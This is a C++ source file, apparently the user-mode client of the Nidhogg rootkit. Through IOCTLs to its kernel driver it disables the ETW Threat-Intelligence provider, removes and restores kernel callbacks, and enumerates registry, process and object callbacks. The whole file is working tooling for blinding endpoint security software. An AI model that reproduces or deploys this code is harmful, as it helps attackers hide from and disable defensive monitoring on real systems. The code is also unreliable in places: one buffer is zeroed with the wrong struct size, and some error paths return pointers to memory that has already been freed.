#include "pch.h"
#include "Nidhogg.h"

NidhoggErrorCodes NidhoggInterface::EnableDisableEtwTi(bool enable) {
	DWORD returned;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_ENABLE_DISABLE_ETWTI,
		&enable, sizeof(enable),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::DisableCallback(ULONG64 callbackAddress, CallbackType callbackType) {
	KernelCallback callback{};
	DWORD returned;

	callback.CallbackAddress = callbackAddress;
	callback.Type = callbackType;
	callback.Remove = true;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_REMOVE_RESTORE_CALLBACK,
		&callback, sizeof(callback),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::RestoreCallback(ULONG64 callbackAddress, CallbackType callbackType) {
	KernelCallback callback{};
	DWORD returned;

	callback.CallbackAddress = callbackAddress;
	callback.Type = callbackType;
	callback.Remove = false;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_REMOVE_RESTORE_CALLBACK,
		&callback, sizeof(callback),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

	return NIDHOGG_SUCCESS;
}

CmCallbacksList NidhoggInterface::ListRegistryCallbacks(NidhoggErrorCodes* success) {
	CmCallbacksList callbacks{};
	DWORD returned;
	callbacks.Callbacks = (CmCallback*)malloc(MAX_ROUTINES * sizeof(CmCallback));

	if (!callbacks.Callbacks) {
		*success = NIDHOGG_GENERAL_ERROR;
		return callbacks;
	}
	memset(callbacks.Callbacks, 0, MAX_ROUTINES * sizeof(PsRoutine));

	if (!DeviceIoControl(this->hNidhogg, IOCTL_LIST_REGCALLBACKS,
		&callbacks, sizeof(callbacks),
		&callbacks, sizeof(callbacks), &returned, nullptr)) {
		*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
		free(callbacks.Callbacks);
		return callbacks;
	}
	*success = NIDHOGG_SUCCESS;
	return callbacks;
}

PsRoutinesList NidhoggInterface::ListPsRoutines(CallbackType callbackType, NidhoggErrorCodes* success) {
	PsRoutinesList routines{};
	DWORD returned;
	routines.Type = callbackType;
	routines.Routines = (PsRoutine*)malloc(MAX_ROUTINES * sizeof(PsRoutine));

	if (!routines.Routines) {
		*success = NIDHOGG_GENERAL_ERROR;
		return routines;
	}
	memset(routines.Routines, 0, MAX_ROUTINES * sizeof(PsRoutine));

	if (!DeviceIoControl(this->hNidhogg, IOCTL_LIST_PSROUTINES,
		&routines, sizeof(routines),
		&routines, sizeof(routines), &returned, nullptr)) {
		*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
		free(routines.Routines);
		return routines;
	}
	*success = NIDHOGG_SUCCESS;

	return routines;
}

ObCallbacksList NidhoggInterface::ListObCallbacks(CallbackType callbackType, NidhoggErrorCodes* success) {
	ObCallbacksList callbacks{};
	DWORD returned;
	callbacks.NumberOfCallbacks = 0;
	callbacks.Type = callbackType;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_LIST_OBCALLBACKS,
		&callbacks, sizeof(callbacks),
		&callbacks, sizeof(callbacks), &returned, nullptr)) {
		*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
		return callbacks;
	}

	if (callbackType == ObProcessType || callbackType == ObThreadType) {
		if (callbacks.NumberOfCallbacks > 0) {
			switch (callbackType) {
			case ObProcessType:
			case ObThreadType:
				callbacks.Callbacks = (ObCallback*)malloc(callbacks.NumberOfCallbacks * sizeof(ObCallback));

				if (!callbacks.Callbacks) {
					*success = NIDHOGG_GENERAL_ERROR;
					return callbacks;
				}
				memset(callbacks.Callbacks, 0, callbacks.NumberOfCallbacks * sizeof(ObCallback));

				break;
			}

			if (!DeviceIoControl(this->hNidhogg, IOCTL_LIST_OBCALLBACKS,
				&callbacks, sizeof(callbacks),
				&callbacks, sizeof(callbacks), &returned, nullptr)) {
				free(callbacks.Callbacks);
				*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
				return callbacks;
			}
		}
	}

	*success = NIDHOGG_SUCCESS;
	return callbacks;
}
